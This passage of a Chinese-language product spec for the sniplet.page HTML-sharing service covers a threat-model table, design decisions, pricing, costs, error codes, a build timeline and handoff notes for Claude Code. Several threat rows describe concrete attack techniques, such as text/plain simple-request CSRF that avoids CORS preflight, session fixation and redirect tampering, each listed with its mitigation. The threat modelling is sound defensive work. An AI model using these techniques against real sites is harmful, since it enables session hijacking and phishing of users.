| 40 | **Email security scanner 預取 `/auth/verify`** | **兩段式 auth + one-shot token 已根本解**(v0.8.10);scanner 做 GET 只會看到 HTML 確認頁,不會觸發 consume |
| 41 | **Team tier 內互信假設破裂**(v2 Team tier 未來) | v2 設計時重新引入 Fetch Metadata 等軟體層防線 for intra-team;v0.8.10 know-how 留存 |
| 42 | **Session cookie 外洩無 per-user revocation**(v0.8.11 S-4b F-29 新增,v0.8.13 縮 window) | Cookie 被 malware / 裝置遺失偷走,**7 天內**(v0.8.13 從 30 天縮,與 sniplet TTL 對齊)攻擊者可讀 Alice 白名單內的私享 sniplet(read-only;無法 create/delete/PATCH)。嚴重度 LOW。Mitigation:(a) Alice 自己 `/auth/logout` 清當前裝置 cookie;(b) Operator 走 RUNBOOK §2.2 `SESSION_JWT_SECRET` 輪換(nuclear,全體登出)作 last resort;(c) v2 做 JWT revoke list 提供 per-user 選項 |
| 43 | **`/auth/logout` CSRF**(v0.8.11 S-6 新增) | `SameSite=Lax` 不擋 logout CSRF(`Set-Cookie: Max-Age=0` 無條件生效);加 `Origin` header 檢查(§8 /auth/logout),合法源 `sniplet.page` / `*.sniplet.page` 才處理 |
| 44 | **Session cookie 散到 `api.sniplet.page`**(v0.8.11 S-3 新增) | Cookie `Domain=sniplet.page` 會被 browser 帶到 api subdomain,但 API 完全不使用 session cookie(只用 `Authorization: Bearer owner_token`)。Mitigation:§7.20 明示 API Worker MUST 忽略 `st` cookie、MUST NOT log `Cookie` header(§7.22);真實風險僅在「API 某天被誤用 log 了整包 headers」此紀律漏洞 |
| 45 | **/auth/consume session fixation CSRF**(v0.8.14 F-35 加) | Eve 的 sniplet HTML 以 `Content-Type: text/plain` + Eve 的 magic token 對 `/auth/consume` 發 simple request,繞過 CORS preflight,server 原本會 `Set-Cookie` 讓受害 browser 被覆寫成 Eve 的 session。Mitigation:`/auth/consume` 要 `Origin === https://sniplet.page` + `Content-Type: application/json`,不符 400;見 §8 /auth/consume 前置檢查 |
| 46 | **/auth/consume `return_to` URL tampering**(v0.8.14 F-36 加) | Email 被轉寄 / browser 歷程 / 中間人在 magic link URL 加 `&r=` 把 post-login redirect 導到 `evil-x9k2.sniplet.page`。Mitigation:`return_to` 只從 JWT claim(server 自簽)取,body `r` 不信任;§7.13 + §8 /auth/consume 明寫 |
| 47 | **Simple-request CSRF via 非-JSON Content-Type**(v0.8.14 F-37 加) | `<form enctype="text/plain">` 可送跨站 POST 不觸發 CORS preflight,若 server 容忍 body parse 則被動做事。Mitigation:§8.0 通用 POST invariants 強制所有 JSON 端點 MUST `Content-Type: application/json`,不符 400 `invalid_content_type`;`/v1/csp-report` 例外(browser 產)仍列 accept list |
| 48 | **Creator HTML 觸發 Device API phishing**(v0.8.14 F-38 加) | CSP 不管 `navigator.geolocation` / `mediaDevices.getUserMedia` / `PaymentRequest` / WebAuthn 等 Device API;creator 可偽裝 video meeting / payment UI,viewer 看合法 HTTPS domain 同意率不低。Mitigation:`Permissions-Policy` header 全面 `=()`;§7.19 |
| 49 | **寄件網域缺 DMARC,magic link phishing 代打**(v0.8.14 F-39 加) | 沒 DMARC `p=reject` 則外部 MTA 可能接受偽造 `From: sniplet.page` 的信。主旨通用(§9),viewer 無法分辨真假 magic link。Mitigation:RUNBOOK §7 setup checklist 加 DMARC record,先 `p=quarantine` 觀察 7 天再 `p=reject`;`adkim=s + aspf=s` 嚴格 alignment |
| 50 | **`/v1/csp-report` 被匿名 flood 燒 Analytics 配額**(v0.8.15 F-40 加) | 此 endpoint 依 CSP spec 無法認證 + 無 Origin 限制,攻擊者可灌爆 Analytics Engine 100k/day 免費配額 + 製造 `csp_violation` alert fatigue。Mitigation:per-IP 100/min rate limit + body 8KB cap + CT 白名單;`csp_report_rate_limited` event 偵測 |
| 51 | **`MAGIC_CONSUMED_KV` eventual-consistency replay race**(v0.8.15 F-41 明文 document) | 攻擊者若持 valid magic JWT 且能精準時間同步兩個遠距 CF PoP 同時 POST `/auth/consume`,KV 複製 <10 秒 window 內兩端皆讀 null,可產生兩個 session。前提嚴苛;成功後果僅「多一個同權限 session」非權限提升。現行 `auth_consumed outcome=replay > 10/hr` alert 可偵測。v2 升 Durable Objects counter |
| 52 | **Owner 操作無 audit log / notification**(v0.8.15 F-42 部分解) | owner_token 若洩漏,攻擊者可悄悄 DELETE / PATCH。v0.8.15 加 `sniplet_mutated { action, slug_hash }` Analytics event,operator 可從 spike 偵測;但**無 creator 通知管道**(v1 匿名,無 creator identity),完整通知留 v2(creator account 上線時一起做) |

## 13. 最終決策表

| # | 決策 | 選定 |
|---|------|------|
| 1 | 產品名稱 | **sniplet.page**(品牌=網域) |
| 2 | URL 結構 | **Subdomain-based**(`{slug}.sniplet.page`,v0.8.10 從 path-based 改) |
| 3 | Slug 來源 | **Agent 給** |
| 4 | Slug 衝突處理 | **永遠 postfix**(v0.8.10 從「衝突才 postfix」改) |
| 5 | Postfix 長度 | **4 字元** [a-z0-9] |
| 6 | TTL | **7 天** |
| 7 | owner_token | **MVP 就做**,32 bytes entropy |
| 8 | HTML footer 注入 | **不加** |
| 9 | Landing page | **另軌**(Claude Design) |
| 10 | Root `sniplet.page/` 行為 | **永遠回 SKILL.md text/plain**(v0.8.13 取消 Accept 分流);`/SKILL.md` 為同義別名;與 product thesis「沒有 SaaS landing,域名背後就是這個 spec」對齊 |
| 11 | Email-gated | **v1 免費、無 creator 配額** |
| 12 | Magic link 廠商 | **Resend** |
| 13 | 未授權 email | **Strategy C** |
| 14 | Email template | **B 乾淨有品**,主旨通用 |
| 15 | `POST /v1/sniplets` RL | **Daily cap 1000 全站 + per-IP 50/day** |
| 16 | 每日總量 cap | **1000 / day** |
| 17 | `/auth/request` RL | **Turnstile + 3/hr 10/day per email + 30/day per IP(v0.8.10 加)** |
| 18 | Cron 時間 | **UTC 02:00** |
| 19 | `claim_url` 預留 | **不預留** |
| 20 | Viewers 編輯 | **PATCH endpoint**,可跨 mode 切換 |
| 21 | GitHub repo | **`github.com:xpsteven/sniplet`(private)**;對外分發走 apex `sniplet.page/` 永遠回 SKILL.md(text/plain),repo 不公開 |
| 22 | Viewers 上限 | **3 email / sniplet(Free)** |
| 23 | ~~Edge caching~~ | **v0.8.10 移除**(ROI 低 + invalidation 複雜度) |
| 24 | Email reverse index | **KV + HMAC-SHA256 with `EMAIL_HASH_SECRET`** |
| 25 | Analytics | **Workers Analytics Engine**(backend only) |
| 26 | 廣告 / 第三方追蹤 | **永不做** |
| 27 | Creator 認證 | **v2 與 Pro tier 一起做** |
| 28 | HTML 大小限制 | **1MB** |
| 29 | Stack | **TypeScript on Cloudflare Workers** |
| 30 | HTTP security headers | **XFO DENY + X-Content-Type-Options + Referrer-Policy + HSTS**(v0.8.10 `CSP frame-ancestors` 改由統一 CSP 處理) |
| 31 | 失敗 GET 的 IP rate limit | **不做** |
| 32 | 純自訂 slug(strict mode) | **v2 Pro tier 付費功能** |
| 33 | ~~跨 sniplet 洩漏防護(P0)~~ | **subdomain architecture + SOP 天然解決**(v0.8.10;整組刪除 Fetch Metadata / COOP / 相關 checklist) |
| 34 | **JWT purpose 驗證** | **強制 `purpose` 欄位比對** |
| 35 | **return_to 驗證** | **嚴格 hostname 白名單(含 postfix 格式)** |
| 36 | **owner_token 比對** | **Constant-time**(`node:crypto.timingSafeEqual` 或手寫;**非** `crypto.subtle.timingSafeEqual` 該 API 不存在) |
| 37 | **Email 正規化** | **lowercase + trim 後 HMAC** |
| 38 | **Logout endpoint** | **`POST /auth/logout` v1 做** |
| 39 | **Logging hygiene** | **§7.22 明列 + CF Log Push hygiene** |
| 40 | **IP hash 演算法** | **HMAC-SHA256 with `IP_HASH_SECRET`** |
| 41 | **Session cookie Domain** | **`Domain=sniplet.page`**(v0.8.10 從 host-only 改;讓 cookie 跨 `*.sniplet.page` 共享,SOP 保證內容隔離) |
| 42 | **`/auth/request` Resend 呼叫方式** | **`ctx.waitUntil()` defer** |
| 43 | **JWT secret 拆分** | **`SESSION_JWT_SECRET` + `MAGIC_JWT_SECRET`** |
| 44 | **X-Frame-Options** | **DENY** |
| 45 | **過期 sniplet status code** | **404** |
| 46 | **Ops monitoring** | **Resend / cron / daily_cap / rate_limit / csp_violation / auth_consumed replay 六類 alert** |
| 47 | **Doc 交付** | **`RUNBOOK.md`(ops 私藏)+ `/security` page + `/.well-known/security.txt`(公開於網站)** |
| 48 | ~~私享 sniplet COOP~~ | **v0.8.10 移除**(subdomain 下 cross-origin window.open 被 SOP 擋) |
| 49 | **IPv6 per-IP normalize** | **/64** |
| 50 | ~~Edge cache TTL~~ | **v0.8.10 移除 edge cache** |
| 51 | **JWT 演算法** | **`HS256`** enforce |
| 52 | **meta.json `ua` 欄位** | **拿掉** |
| 53 | **Slug postfix 產生方式** | **`crypto.getRandomValues()`** |
| 54 | **Subdomain architecture**(v0.8.10 加) | **`{slug}.sniplet.page`**;wildcard DNS + Universal SSL(免費)一層 wildcard |
| 55 | **Slug 永遠 postfix**(v0.8.10 加) | 即使 slug 唯一也加 4 字元 postfix;防品牌挪用與 phishing 混淆 |
| 56 | **統一嚴格 CSP**(v0.8.10 加,v0.8.13 縮 CDN,v0.8.14 加回 Tailwind) | 所有 sniplet 共用;`connect-src 'none'`、script-src allowlist **cdnjs + cdn.tailwindcss.com**(v0.8.14 加 Tailwind Play CDN,因 AI 生成 HTML 太常見且 Play CDN 是 v3+ JIT 唯一 hosting);jsdelivr / unpkg 為 npm auto-mirror 不加;img 限 data/blob;定位為 per-sniplet sandbox + platform abuse 防線,**非** cross-sniplet isolation(那是 subdomain + SOP) |
| 57 | **兩段式 auth + one-shot token**(v0.8.10 加) | `GET /auth/verify` 顯示確認頁不 consume;`POST /auth/consume` 實際驗證;`MAGIC_CONSUMED_KV` 防 replay;防 email scanner 預取 |
| 58 | **Status page**(v0.8.10 加,v0.8.13 改 channel) | **v1 不做**,SEV 事件透過 `sniplet.page/security#advisories` 段落公告(v0.8.13 從 GitHub README 改,因 repo 改 private);v2 評估 instatus |
| 59 | **CF Log Push hygiene**(v0.8.10 加) | ops setup 必須確認未啟用,或 `Authorization` header 在 drop list |
| 60 | **Viewer email HMAC 儲存**(v0.8.11 加,F-11 升 v1) | `meta.viewers[]` 存 `{ h: HMAC, m: masked }`;JWT `sub` 亦為 HMAC;R2 / cookie 外洩不等於 email 外洩 |
| 61 | **Public security policy 載體**(v0.8.11 加) | 取消 `SECURITY.md` 交付檔;改以 `sniplet.page/security`(§10.7)+ `/.well-known/security.txt`(§10.8 RFC 9116)公開,符合 non-open-source SaaS 慣例 |
| 62 | **`/auth/logout` Origin check**(v0.8.11 加,S-6) | MUST 驗 `Origin` header 等於 `https://sniplet.page` 或 `https://*.sniplet.page` 的合法 postfixed slug;擋跨站 CSRF logout |
| 63 | **`/auth/request` 全站 send cap**(v0.8.12 加,F-32) | **B2:METER_KV counter + peek 在 whitelist lookup 前 + 503 loud fail**;cap 預設 100/day,對齊 Resend 免費 tier;僅在實際 send path 計數 |
| 64 | **Owner 操作 status code 統一**(v0.8.12 加,F-33) | **DELETE / PATCH 的 slug-not-found 與 token-mismatch 統一回 401**,消除 slug enumeration free oracle;驗證順序為「讀 meta → constant-time token 比對(miss 用 dummy hash)→ 通過再檢 expiry」 |
| 65 | **R2 寫入原子性**(v0.8.12 加,F-34) | **`put` 一律帶 `onlyIf: { etagDoesNotMatch: '*' }`**,`PreconditionFailed` 觸發 postfix retry;禁止「先 head 再 put」的 TOCTOU race 做法 |
| 66 | **/auth/consume Origin + CT 檢查**(v0.8.14 加,F-35) | **MUST `Origin === https://sniplet.page` + `Content-Type: application/json`**;擋 session fixation CSRF(Eve 用 text/plain simple-request 繞 CORS preflight 把 Eve token 塞進受害 browser);見 §8 /auth/consume 前置檢查 |
| 67 | **/auth/consume `return_to` 權威來源**(v0.8.14 加,F-36) | **`return_to` 只從 JWT claim 取,body `r` 不信任**;`/auth/consume` body 簡化為 `{ "t": <jwt> }`;verify page URL 也移除 `&r=`;擋 email 轉寄 / URL tampering 時的 redirect 劫持 |
| 68 | **通用 POST Content-Type enforce**(v0.8.14 加,F-37) | §8.0 通用 invariants:所有 JSON endpoint MUST `Content-Type: application/json`,不符 400 `invalid_content_type`;擋 `<form enctype="text/plain">` 類 simple-request CSRF;`/v1/csp-report` 例外(同時接受 `application/csp-report`) |
| 69 | **Permissions-Policy header**(v0.8.14 加,F-38) | 所有平台 response 加 `Permissions-Policy: <feature>=()` 禁用 geolocation / camera / microphone / payment / WebAuthn / USB / 感測器 / 螢幕錄製 / clipboard-read / FLoC 等;CSP 之外的 Device API 防線,擋 creator HTML 做 phishing prompt;`clipboard-write` 不禁(允許 sniplet 做 copy-to-clipboard UX) |
| 70 | **DMARC record**(v0.8.14 加,F-39) | `_dmarc.sniplet.page TXT "v=DMARC1; p=reject; rua=mailto:security@sniplet.page; adkim=s; aspf=s"`;擋 magic link 偽造釣魚;初上線可先 `p=quarantine` 觀察 7 天再升 `reject` |
| 71 | **Tailwind Play CDN 加回 allowlist**(v0.8.14 加) | `script-src` 額外允許 `https://cdn.tailwindcss.com`;因 AI 生成 HTML 太常見且 Play CDN 是 v3+ JIT 唯一支援 hosting;`style-src` 不加(Play CDN 走 JS 注入 `<style>`,已 cover 於 `'unsafe-inline'`);F-26 supply chain 範圍擴大至「cdnjs + tailwindcss」兩處 |
| 72 | **`/v1/csp-report` 量級保護**(v0.8.15 加,F-40) | per-IP 100/min rate limit(`rl_csp:<hmac>:<minute>` KV key)+ body 8KB cap + CT 白名單(`application/csp-report` / `application/json`);超限觸發 `csp_report_rate_limited` event + alert;擋 DoS 燒 Analytics 配額 |
| 73 | **`MAGIC_CONSUMED_KV` replay race 接受 document**(v0.8.15 加,F-41) | 明文 document KV 最終一致性的 replay window(< 10 秒 + 精準時間同步 + 持他人 magic JWT 三嚴格前提);現有 `auth_consumed outcome=replay` alert 偵測;v2 升 Durable Objects 為升級路徑 |
| 74 | **Owner 操作 audit event**(v0.8.15 加,F-42) | PATCH / DELETE 成功後寫 `sniplet_mutated { action, slug_hash(SHA-256) }` Analytics event;slug 僅 hash;擋 owner_token 洩漏後的靜默濫用(operator 從 spike 偵測) |

## 14. 商業模式(v1 免費、v2 起分層)

### v1(MVP)
**全部免費**。包含所有 in-scope 功能(email-gate、多 viewers、7 天 TTL)。

目標:**驗證 PMF + 建立網絡效應**(viewer → creator 漏斗)。

### v2(分層)

| Tier | 月費 | 對象 | 功能增量(相對 Free) |
|------|------|------|----------------------|
| **Free** | $0 | 個人輕用 | v1 所有功能、7 天 TTL、3 viewers/sniplet |
| **Pro** | $5-8 | 個人重度 / 創作者 | 30 天 TTL、viewers 上限提升至 50(或無上限)、**純自訂 slug(no postfix)**、owner dashboard (stats)、Creator account(device flow) |
| **Team** | $12-16/user | B2B 團隊 | 上述 + team workspace、SSO、共用 viewers 白名單、審計 log、**`{team}.sniplet.page/{slug}` team subdomain**、SLA |

Enterprise tier(自訂網域、on-prem)另議,不在 v2 scope。

具體定價待市場測試。

**Pro 主要付費動機**:
1. 純自訂 slug(仍加 postfix 作為品牌保護,但 slug 部分無 server-side 衝突 postfix)
2. Long TTL(給長期需要的內容)
3. Dashboard 看 stats
4. 提升 viewers 上限

### 收入假設
- **Cloudflare 成本極低**(見 §15):egress 免費,爆紅不破產
- **Resend 是主要變動成本**:3000 封免費,超過升 Pro $20
- **Break-even 門檻**:幾個 Pro 用戶就 cover 早期成本
- **主要收入來自 Team**:B2B sales 路線,個人 Free 當漏斗

### 獲客邏輯
1. Creator 在 agent 產 HTML → 用 sniplet skill 分享
2. Receiver(可能是公司同事)點開 → 第一次見到 sniplet.page 品牌
3. Receiver 也開始用 → 變 creator → 公司內部擴散
4. 達一定使用量 → 推 Team workspace

**Viewer email 不作他用**,但 aggregate domain distribution 可作 B2B sales 的 lead signal(合法)。

### 不做的事
- ❌ 賣 viewer email 名單 / 意圖資料
- ❌ 注入第三方廣告 / GA
- ❌ 追蹤 cross-site behavior
- ❌ 在 sniplet 內容頁放任何 tracking script

## 15. 成本預估

### 單位成本參考

| 項目 | 免費額度 | 超過後 |
|------|---------|--------|
| Workers Requests | 10M/月(Paid $5) | $0.30 / M |
| R2 Storage(Standard) | 10 GB | $0.015 / GB-月 |
| R2 Class A(寫) | 1M/月 | $4.50 / M |
| R2 Class B(讀) | 10M/月 | $0.36 / M |
| KV Reads | 100k / 日 | $0.50 / M |
| KV Writes | 1k / 日 | $5.00 / M |
| Analytics Engine | 100k data points / 日 | Beta 免費 |
| Turnstile | 無限 | 免費 |
| Cron Triggers | 無限 | 免費 |
| **Egress bandwidth** | **全部免費**(Cloudflare 策略) | — |
| Resend | 3000 封 / 月 | Pro $20(50k 封)→ Scale $90(100k)→ 更高 |
| 網域 sniplet.page | — | ~$8 / 年 = $0.67 / 月 |

### 四個 Scenario(無 edge cache 情境)

**A. MVP(月 100 sniplets)**
- 1,000 views、20 gated、~60 magic link emails
- 全部在免費額度內
- **月成本:$0.67**(只有網域)

**B. 驗證(月 5,000 sniplets)**
- 50k views、1,500 gated、~4,500 emails
- Cloudflare:全免費(operations 遠低於 quota)
- Resend:超過 3k 免費 → 升 Pro $20
- **月成本:~$21**

**C. 成長(月 100,000 sniplets)**
- 2M views、30k gated、~90k emails
- Workers requests:2M + 100k + auth ≈ 2.5M,超過 Paid plan 10M 額度 → 升 Paid $5
- R2 Class A:100k writes(遠低 1M 額度)
- R2 Class B:2M reads(無 cache,直接讀 R2)→ $0.72
- KV:rate limit + index writes ≈ 500k reads、200k writes → 略超額度,KV reads $0.20、writes $1.00
- Resend:升 Scale ~$90
- **月成本:~$97**(Workers $5 + R2 reads $0.72 + Resend $90 + KV ~$1.5 + R2 storage ~$0.15 + 網域)

**D. 爆紅(月 1,000,000 sniplets)**
- 20M views、300k gated、~900k emails
- Workers:Paid $5 + 超額 12M × $0.30 = $3.60 → $9
- R2 storage:假設 1TB → $15
- R2 Class B:20M reads(無 cache)→ $7.2
- KV:~$5
- Resend:~$500(需 Enterprise 議價)
- **月成本:~$537**

### Break-even 分析

假設 Pro $7/月、Team $15/user/月:

| Scenario | 月成本 | Break-even 需要 |
|----------|-------|-----------------|
| B | $21 | **3 個 Pro 用戶** |
| C | $97 | 14 個 Pro,或 7 個 Team 座位 |
| D | $537 | 77 個 Pro,或 36 個 Team 座位 |

業界 freemium 轉化率約 2-5%。Scenario C(10 萬 sniplets、估幾千活躍 creator)保守估算 3% → 100+ 付費用戶,**月 loss 變成 $600-700 淨賺**。

### 關鍵洞察

1. **Cloudflare 成本曲線極平緩**:就算 Scenario D 月百萬 sniplets,CF 總成本 < $30,egress 免費是真的佛心
2. **Resend 是唯一真正的變動成本**:佔 Scenario D 的 93%。未來 v2 若想大幅降低,可評估自架 email
3. **付費門檻極低**:從 Scenario B 開始,3-5 個 Pro 就打平
4. **移除 edge cache 的成本影響**:Scenario C 多 $0.72、Scenario D 多 $7 左右,**全在 noise 範圍**。cache 的 invalidation 複雜度(尤其 edge-local `cache.delete` 的 stale window)遠超省下的這點錢,v0.8.10 決定拿掉是對的

## 16. 錯誤碼總表(SSOT)

**說明**:所有 API 錯誤的 single source of truth。實作時以此為準;若與前面章節矛盾,以本章為主並回報 diff。

### 通用 Error Response 格式

所有錯誤回應(HTTP 4xx/5xx)統一 JSON 結構:

```json
{
  "error": "<machine_readable_code>",
  "message": "<human_readable_explanation>",
  "details": { /* optional, error-specific */ }
}
```

**例外**:
- 204 No Content 無 body
- `GET /auth/verify` 永遠回 HTML 確認頁(無錯誤)
- `GET /` on `{slug}.sniplet.page` 無權限回 challenge page HTML,HTTP 200

### POST `/v1/sniplets`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_content_type` | Content-Type 非 `application/json`(F-37) |
| 400 | `invalid_format` | slug 格式不符;HTML > 1MB;viewers email 格式錯 |
| 400 | `reserved_slug` | slug 加 postfix 後撞 reserved subdomain |
| 400 | `viewers_exceeded` | viewers 超過 3 |
| 400 | `viewers_empty` | viewers 傳了 `[]` |
| 429 | `rate_limited` | 單一 IP 當日 50 個 sniplets 用盡 |
| 451 | `blocked_content` | abuse 偵測觸發 |
| 500 | `slug_retry_exhausted` | postfix 5 次後仍衝突(極罕見) |
| 503 | `daily_cap_exceeded` | 當日全站 1000 cap |

**Success 200**:
```json
{
  "slug": "q3-sales-dashboard-a7k2",
  "url": "https://q3-sales-dashboard-a7k2.sniplet.page",
  "expires_at": "2026-04-25T14:30:00Z",
  "owner_token": "ot_...",
  "access": "public",
  "viewers_masked": ["a***@co.com"] | null
}
```

### PATCH `/v1/sniplets/:slug/viewers`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_content_type` | Content-Type 非 `application/json`(F-37) |
| 400 | `invalid_format` | email 格式錯 |
| 400 | `viewers_exceeded` | add 後超過 3 |
| 400 | `empty_request` | add + remove 都空 |
| 401 | `invalid_token` | owner_token 缺失 / 錯誤 / slug 不存在(F-33 統一) |
| 410 | `expired` | sniplet 已過期(僅 valid token 驗證後可見) |

**Success 200**:
```json
{ "viewers_masked": ["a***@co.com", ...] | null, "access": "public" | "email-gated" }
```

### DELETE `/v1/sniplets/:slug`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 401 | `invalid_token` | token 缺失 / 錯誤 / slug 不存在(F-33 統一) |
| 410 | `expired` | sniplet 已過期(僅 valid token 驗證後可見) |

**Success**: 204 No Content

### GET `/` on `{slug}.sniplet.page`

| HTTP | Content-Type | 條件 | Response |
|------|-------------|------|----------|
| 200 | `text/html` | 公開 / 已驗證私享 | Serve HTML + security headers + CSP |
| 200 | `text/html` | 私享無 cookie / 驗失敗 | Challenge page |
| 404 | `text/html` | 不存在 / 已過期 | 404 頁(統一 "Not found") |

**Cache-Control**:一律 `no-store`(v0.8.10 移除 edge cache)

### POST `/auth/request`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_content_type` | Content-Type 非 `application/json`(F-37) |
| 400 | `turnstile_failed` | Turnstile token 錯 |
| 400 | `invalid_format` | email 格式錯 / body 結構錯 |
| 429 | `rate_limited` | per-email hr/day 或 per-IP day 額度用盡 |
| 503 | `service_unavailable` | 全站 `auth_send_daily` cap 達到(F-32);peek 在 KV whitelist lookup 之前,雙 path 一致 |

**Success**: `200 { "status": "sent" }`(Strategy C:不論 email 是否在白名單)

### GET `/auth/verify?t=<token>`

- **永遠回 200**,內容為 HTML 確認頁
- **不 consume token**,不 set cookie
- Token 驗證延遲到 `/auth/consume`
- `return_to` 已移至 JWT claim(F-36,v0.8.14),URL 不再需要 `&r=` query param

### POST `/auth/consume`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_content_type` | Content-Type 非 `application/json`(F-37) |
| 400 | `invalid_origin` | Origin 非 `https://sniplet.page`(F-35,擋 session fixation CSRF) |
| 400 | `invalid_format` | body 結構錯 |
| 401 | `invalid_token` | JWT 簽章 / purpose / algorithm 不符 |
| 410 | `token_expired` | JWT exp 過期 |
| 422 | `already_consumed` | jti 已在 MAGIC_CONSUMED_KV 中 |

**Success 200**:
```json
{ "redirect": "https://q3-private-m8f1.sniplet.page/" }
```

**Body**(v0.8.14 F-36 簡化):`{ "t": "<magic-jwt>" }`;`return_to` 來自 JWT claim,不接受 body `r`。

### POST `/auth/logout`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_origin` | `Origin` header 缺失,或不符合 `sniplet.page` / `*.sniplet.page`(v0.8.11 S-6 CSRF 防護) |

- **Success**:`200 { "status": "logged_out" }` + `Set-Cookie: st=; Max-Age=0; Domain=sniplet.page`

### POST `/v1/csp-report`(v0.8.15 F-40 加 rate limit)

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_content_type` | CT 非 `application/csp-report` / `application/json` |
| 400 | `invalid_format` | Body 非 CSP report 結構 |
| 413 | `payload_too_large` | Body > 8192 bytes |
| 429 | `rate_limited` | 單 IP 當分鐘超過 100 筆(F-40) |

- **Success**:`204 No Content`,無 body

### 依 HTTP Status 快查

| Status | 意義 | 出現處 |
|--------|------|--------|
| 200 | 成功 | 多處 |
| 204 | 成功無 body | DELETE |
| 400 | Bad Request | POST、PATCH、/auth/request、/auth/consume、/auth/logout(invalid_origin);`invalid_content_type` 可能出現於任何 JSON 端點(F-37) |
| 401 | Unauthorized | PATCH、DELETE(含 slug 不存在,F-33 統一)、/auth/consume |
| 404 | Not Found | GET `{slug}.sniplet.page/`(含過期) |
| 410 | Gone | PATCH、DELETE(已過期,僅 valid token 驗證後可見;公眾 GET 統一 404);/auth/consume(token 過期) |
| 422 | Unprocessable | /auth/consume(已 consumed) |
| 413 | Payload Too Large | POST /v1/csp-report(body > 8KB,F-40) |
| 429 | Too Many Requests | POST /v1/sniplets(per-IP)、/auth/request(per-email, per-IP)、/v1/csp-report(per-IP 100/min,F-40) |
| 451 | Unavailable For Legal Reasons | POST (blocked) |
| 500 | Server Error | postfix exhausted |
| 503 | Service Unavailable | POST /v1/sniplets(全站 1000/day)、/auth/request(全站 send cap,F-32) |

### Error Logging

每個錯誤觸發時 Analytics Engine 記錄:

```ts
env.ANALYTICS.writeDataPoint({
  blobs: ["error", endpoint, error_code],
  indexes: [today]
});
```

**不記錄**:response body 內容、user email、IP、HTML 內容、magic token、owner_token。

## 17. Implementation 時間軸 (≈11 hr effort)

以下為純 effort 估算。0–1hr 的前置步驟建議在正式 coding 前先完成。

| 階段 | 里程碑 |
|------|--------|
| 0–1hr(前置) | Cloudflare 註冊 sniplet.page、DNS 生效、**wildcard DNS record `*.sniplet.page` → Workers**、**啟用 DNSSEC**、設 CAA record、Resend 註冊 + **DKIM + SPF + DMARC(F-39)** + 取 `RESEND_API_KEY`、Bot Fight Mode 啟用、Turnstile site 建立 + 取 `TURNSTILE_SECRET`、產生 4 個 random secrets、**確認 CF Log Push 未啟用或 Authorization header 在 drop list**、wildcard SSL cert(Universal SSL 自動 provision) |
| 1–3hr | Worker router(hostname-based 分流 api/apex/sniplet subdomain、reserved subdomains、daily cap、**永遠 postfix** 邏輯)、POST/GET/DELETE/PATCH 核心、**§8.0 通用 POST invariants(Content-Type + Origin check)**、email index 基本寫入、security headers(**統一嚴格 CSP** + XFO DENY + HSTS + **Permissions-Policy F-38**)、1MB 大小檢查、IP hash 用 HMAC + IPv6 normalize 到 /64、local `curl` 通 |
| 3–4hr | 部署 wildcard DNS + 驗證 `{slug}.sniplet.page` 可正常解析並 serve、HTTPS 驗證、apex `/` 與 `/SKILL.md` 永遠回 text/plain SKILL.md |
| 4–5.5hr | Auth:JWT helper(雙 secret、HS256 enforce)、`/auth/request`(ctx.waitUntil + Resend + per-IP rate limit)、**兩段式 `/auth/verify` 確認頁 + `POST /auth/consume`**、`MAGIC_CONSUMED_KV` one-shot、cookie `Domain=sniplet.page` |
| 5.5–7hr | Challenge page(含 cross-origin form POST 設定 + CORS on /auth/request)、viewer 檢查、Turnstile 整合、私享 end-to-end、**跨 sniplet session 共享驗證** |
| 7–8hr | SKILL.md 內容植入 Worker bundle(apex `/` 與 `/SKILL.md` 共用);commit + push 到 private repo;`/security` page(含 advisories 段落)+ `/.well-known/security.txt` 上線;Analytics Engine events 植入(含 csp_violation、auth_consumed);Claude.ai 實測;**CSP violation reporting endpoint `/v1/csp-report`** |
| 8–9hr | TTL cron、edge cases、security headers 驗證、**timing test**、**CSP 實測(各種 CDN、fetch 擋下、img exfil 擋下)**、**SOP cross-sniplet 測試**、**one-shot token 測試**、**email scanner 模擬(curl /auth/verify 不 consume)** |
| 9–10.5hr | End-to-end regression、bug fix、**UX 實測 `{slug}.sniplet.page` URL 在 LINE/Slack/WhatsApp/iMessage auto-link**、設 ops alerts |
| 10.5–11hr | Buffer |
| Ship | v1 MVP live 🚀 |

---

**狀態**:v0.8.15 完成(承接 v0.8.14 + 第八輪 audit MEDIUM 全清 + H-6 csp-report 加保護)。交付檔案:`sniplet-page-prd.md` + `SKILL.md`(frontmatter name `sniplet-page-share`)+ `RUNBOOK.md`(加 §9 CF account security);`/security`(含 `#advisories` 段落)+ `/.well-known/security.txt` 由 Worker 實作(§10.7 / §10.8)。SKILL.md 對外分發為 apex `/` 與 `/SKILL.md` 永遠 text/plain,repo 維持 private。可進入 implementation 階段。

**交付 bundle(3 個檔案 + 3 個 live endpoint)**:
- `sniplet-page-prd.md`(本檔)— 產品、技術、安全、商業、成本完整規格
- `SKILL.md` — AI agent 使用的 skill 定義(frontmatter name `sniplet-page-share`;內容內嵌 Worker bundle,apex `/` 與 `/SKILL.md` 永遠 text/plain serve)
- `RUNBOOK.md` — Secret rotation / incident response / ops 流程(ops 內部,**不公開**)
- `https://sniplet.page/` — Accept: */* 回傳 text/plain SKILL.md(對 AI agent 唯一分發管道;repo 維持 private)
- `https://sniplet.page/security` — 公開安全政策(Worker serves §10.7 HTML)
- `https://sniplet.page/.well-known/security.txt` — RFC 9116(Worker serves §10.8 text)

**給 Claude Code 的交接提醒**:
1. 本 PRD 是 single source of truth,與片段討論矛盾時以本文為準
2. `SKILL.md` 為唯一對外發布的 agent-facing 檔;**apex `/` 與 `/SKILL.md` 永遠 text/plain serve**(v0.8.13 取消 Accept 分流);repo 維持 private,不依賴 GitHub raw URL
3. §16 錯誤碼總表是 implementation reference,所有 API error handling 以此為準
4. GitHub repo 為 `github.com:xpsteven/sniplet`(private);SKILL.md 對外分發為 apex 永遠 text/plain,不依賴 raw URL
5. 先跑 §17 0–1hr 的手動步驟(尤其 wildcard DNS 和 SSL 的生效驗證),再進 coding
6. 全部 §11 checklist 項目在 code review 時逐項勾選

---

## 變更紀錄

